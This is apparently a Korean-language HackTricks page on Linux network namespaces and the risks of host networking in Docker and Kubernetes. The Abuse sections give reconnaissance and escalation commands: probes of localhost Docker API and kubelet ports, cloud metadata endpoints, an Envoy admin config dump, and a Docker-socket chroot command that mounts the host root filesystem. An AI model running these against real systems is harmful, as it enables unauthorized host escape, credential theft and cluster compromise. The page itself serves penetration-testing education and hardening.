# 네트워크 네임스페이스

{{#include ../../../../../banners/hacktricks-training.md}}

## 개요

네트워크 네임스페이스는 인터페이스, IP 주소, 라우팅 테이블, ARP/neighbor 상태, firewall 규칙, 소켓, UNIX-domain abstract socket namespace, 그리고 `/proc/net`과 같은 파일의 내용을 비롯한 네트워크 관련 리소스를 격리합니다.<sup>[[2]](#references)</sup> 따라서 컨테이너는 호스트의 실제 네트워크 스택을 소유하지 않아도 자체 `eth0`, 자체 로컬 라우트, 자체 loopback device를 가진 것처럼 보일 수 있습니다.

보안 측면에서 이는 네트워크 격리가 단순히 포트 바인딩 이상의 의미를 가지기 때문에 중요합니다. private network namespace는 workload가 직접 관찰하거나 재구성할 수 있는 대상을 제한합니다. 해당 namespace를 호스트와 공유하면 컨테이너가 갑자기 호스트 listener, 호스트 로컬 서비스, abstract AF_UNIX endpoint, 그리고 애플리케이션에 노출할 의도가 전혀 없었던 network control point를 볼 수 있게 될 수 있습니다.

## 동작 방식

새로 생성된 network namespace는 인터페이스가 연결될 때까지 비어 있거나 거의 비어 있는 네트워크 환경으로 시작합니다. 이후 container runtime은 virtual interface를 생성하거나 연결하고, 주소를 할당하며, workload가 예상된 연결성을 갖도록 route를 구성합니다. bridge 기반 배포에서는 일반적으로 컨테이너가 호스트 bridge에 연결된 veth 기반 인터페이스를 보게 됩니다. Kubernetes에서는 CNI plugin이 Pod networking에 해당하는 설정을 처리합니다.

이 아키텍처는 `--network=host` 또는 `hostNetwork: true`가 왜 그렇게 극적인 변경인지 설명해 줍니다. workload는 준비된 private network stack을 받는 대신 호스트의 실제 네트워크 스택에 참여하게 됩니다.

## 실습

다음 명령으로 거의 비어 있는 network namespace를 확인할 수 있습니다:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
그리고 다음을 사용하여 일반 컨테이너와 host-networked 컨테이너를 비교할 수 있습니다:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
host-networked container는 더 이상 자체적으로 격리된 socket 및 interface view를 갖지 않습니다. 프로세스에 어떤 capabilities가 있는지 확인하기도 전에, 이 변경만으로도 이미 상당한 의미를 가집니다.

## Runtime Usage

Docker와 Podman은 별도로 구성하지 않는 한 일반적으로 각 container에 private network namespace를 생성합니다. Kubernetes는 보통 각 Pod에 자체 network namespace를 제공하며, 해당 Pod 내부의 container들이 이를 공유하지만 host와는 분리됩니다. 따라서 `127.0.0.1`은 일반적으로 container-local이 아니라 Pod-local입니다. 한 container에서 localhost에만 bind된 listener는 일반적으로 sidecar 및 sibling container에서 접근할 수 있습니다. Incus/LXC 시스템도 풍부한 network-namespace 기반 isolation을 제공하며, 더 다양한 virtual networking 설정을 사용하는 경우가 많습니다.

일반적인 원칙은 private networking이 기본 isolation boundary이고, host networking은 해당 boundary를 명시적으로 해제하는 선택이라는 것입니다.

## Misconfigurations

가장 중요한 misconfiguration은 단순히 host network namespace를 공유하는 것입니다. 이는 성능, low-level monitoring 또는 편의를 위해 수행되기도 하지만, container에서 사용할 수 있는 가장 명확한 boundary 중 하나를 제거합니다. Host-local listener에 더 직접적으로 접근할 수 있게 되고, localhost-only service에 접근할 수 있게 되며, `CAP_NET_ADMIN` 또는 `CAP_NET_RAW`와 같은 capabilities는 훨씬 더 위험해집니다. 이러한 capabilities가 허용하는 작업이 이제 host 자체의 network environment에 적용되기 때문입니다.

또 다른 문제는 network namespace가 private인 경우에도 network 관련 capabilities를 과도하게 부여하는 것입니다. Private namespace는 분명 도움을 주지만, raw socket 또는 advanced network control을 무해하게 만들지는 않습니다.

Kubernetes에서 `hostNetwork: true`는 Pod-level network segmentation에 얼마나 의존할 수 있는지도 변경합니다. Kubernetes 문서에 따르면 많은 network plugin은 `podSelector` / `namespaceSelector` matching에서 `hostNetwork` Pod traffic을 제대로 구분하지 못하므로 이를 일반적인 node traffic으로 처리합니다.<sup>[[1]](#references)</sup> 공격자의 관점에서 이는 compromised `hostNetwork` workload를 overlay-network workload와 동일한 policy 가정으로 제한되는 일반적인 Pod가 아니라, node-level network foothold로 취급해야 하는 경우가 많다는 의미입니다.

## Abuse

격리가 약한 설정에서 공격자는 host listening service를 확인하고, loopback에만 bind된 management endpoint에 접근하며, 정확한 capabilities와 environment에 따라 traffic을 sniff하거나 interfere할 수 있습니다. 또한 `CAP_NET_ADMIN`이 있으면 routing 및 firewall state를 재구성할 수 있습니다. Cluster에서는 이로 인해 lateral movement와 control-plane reconnaissance도 더 쉬워질 수 있습니다.

host networking이 의심된다면 먼저 표시되는 interface와 listener가 isolated container network가 아니라 host에 속하는지 확인하세요:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Loopback 전용 서비스는 종종 가장 먼저 발견되는 흥미로운 대상입니다:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Abstract UNIX 소켓은 TCP/UDP listener처럼 보이지 않고 `/run` 아래에 filesystem path로 존재하지 않을 수도 있기 때문에 쉽게 놓치는 또 다른 대상입니다. 따라서 host-networked container는 컨테이너에 bind-mount되지 않았던 host 전용 control channel에 대한 접근 권한을 상속할 수 있습니다:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
역사적인 사례로는 `containerd-shim` abstract-socket 노출 버그가 있었지만, 특정 CVE보다 더 중요한 교훈은 다음과 같습니다. workload가 host network namespace에 참여하면 abstract AF_UNIX 서비스도 attack surface의 일부가 됩니다.<sup>[[3]](#references)</sup> 해당 소켓이 runtime 관련 또는 관리용으로 보이면 [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md)로 전환합니다.

network capabilities가 존재한다면 workload가 노출된 stack을 검사하거나 변경할 수 있는지 테스트합니다:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
최신 커널에서는 host networking과 `CAP_NET_ADMIN`을 함께 사용하면 단순한 `iptables` / `nftables` 변경을 넘어 packet path에도 접근할 수 있습니다. `tc` qdisc와 filter도 namespace 범위로 적용되므로, host network namespace를 공유하는 경우 container가 볼 수 있는 host interface에 적용됩니다. 또한 `CAP_BPF`가 있으면 TC 및 XDP loader와 같은 네트워크 관련 eBPF program도 고려 대상이 됩니다:<sup>[[4]](#references)</sup>
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
이는 공격자가 firewall rules를 단순히 재작성하는 데 그치지 않고, host interface level에서 traffic을 mirror, redirect, shape 또는 drop할 수 있기 때문에 중요합니다. private network namespace에서는 이러한 작업이 container의 view로 제한되지만, shared host namespace에서는 host에 영향을 미치게 됩니다.

cluster 또는 cloud environments에서는 host networking이 metadata 및 control-plane-adjacent services에 대한 빠른 local recon을 수행할 이유가 되기도 합니다:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
Kubernetes에서는 multi-container Pod의 **어떤** container든 compromise하면 sibling container와 sidecar가 연 localhost listener에도 액세스할 수 있다는 점을 기억해야 합니다. 전체 Pod가 하나의 network namespace를 공유하기 때문입니다. 이는 특히 admin 또는 debug interface가 cluster 전체가 아닌 의도적으로 Pod 내부에서만 접근 가능하도록 설정된 service-mesh, observability, helper container와 관련해 중요합니다:
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
"bound to localhost"를 **Pod-private**로 간주해야 하며, **container-private**로 간주해서는 안 됩니다. Pod 내 컨테이너 하나가 compromise되면 이러한 가정은 더 이상 유효하지 않습니다.

### Full Example: Host Networking + Local Runtime / Kubelet Access

Host networking이 자동으로 host root를 제공하는 것은 아니지만, node 자체에서만 의도적으로 접근 가능하도록 설정된 service를 노출하는 경우가 많습니다. 이러한 service 중 하나라도 보호가 취약하면, host networking은 직접적인 privilege-escalation 경로가 됩니다.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
로컬호스트의 Kubelet:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
영향:

- 적절한 보호 없이 로컬 runtime API가 노출된 경우 직접적인 host compromise
- kubelet 또는 로컬 agents에 접근할 수 있는 경우 cluster reconnaissance 또는 lateral movement
- `CAP_NET_ADMIN`과 결합될 경우 traffic manipulation 또는 denial of service

## 확인

이 확인의 목적은 해당 프로세스가 private network stack을 사용하는지, 어떤 routes와 listeners가 표시되는지, 그리고 capabilities를 테스트하기 전부터 network view가 이미 host와 유사하게 보이는지를 파악하는 것입니다.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
여기서 흥미로운 점:

- `/proc/self/ns/net`과 `/proc/1/ns/net`이 이미 호스트와 유사하게 보인다면, 해당 container가 host network namespace 또는 다른 비-private namespace를 공유하고 있을 수 있습니다.
- shell이 이미 named 또는 persistent namespace 내부에 있고, host 측의 `/run/netns` 객체와 연관 지으려는 경우 `lsns -t net`과 `ip netns identify`가 유용합니다.
- `ss -lntup`은 loopback 전용 listener와 local management endpoint를 확인할 수 있어 특히 유용합니다. `ss -xap`과 `/proc/net/unix`는 일반적인 filesystem socket 탐색에서 놓치는 abstract-socket 관점을 추가합니다.
- `CAP_NET_ADMIN`, `CAP_NET_RAW` 또는 `CAP_BPF`가 있으면 route, interface 이름, firewall context, `tc` 상태와 eBPF attachment가 훨씬 중요해집니다.
- Kubernetes에서 `hostNetwork` Pod의 service-name resolution이 실패하는 경우, service가 없는 것이 아니라 해당 Pod가 `dnsPolicy: ClusterFirstWithHostNet`을 사용하지 않기 때문일 수 있습니다.
- multi-container Pod에서는 localhost listener가 전체 Pod network namespace에 속하므로, loopback 전용 port가 compromised container에서 접근 불가능하다고 판단하기 전에 sidecar와 sibling container를 확인해야 합니다.

container를 검토할 때는 항상 capability set과 함께 network namespace를 평가해야 합니다. Host networking과 강력한 network capability가 결합된 경우는 bridge networking과 제한적인 default capability set을 사용하는 경우와 보안 상태가 크게 다릅니다.

## References

- [1] [Kubernetes NetworkPolicy 및 `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [2] [Linux `network_namespaces(7)` 및 abstract UNIX socket isolation](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [3] [containerd advisory: host-network container에 노출된 abstract Unix domain socket](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [4] [network-related eBPF program에 대한 eBPF token 및 capability requirements](https://docs.ebpf.io/linux/concepts/token/)

{{#include ../../../../../banners/hacktricks-training.md}}
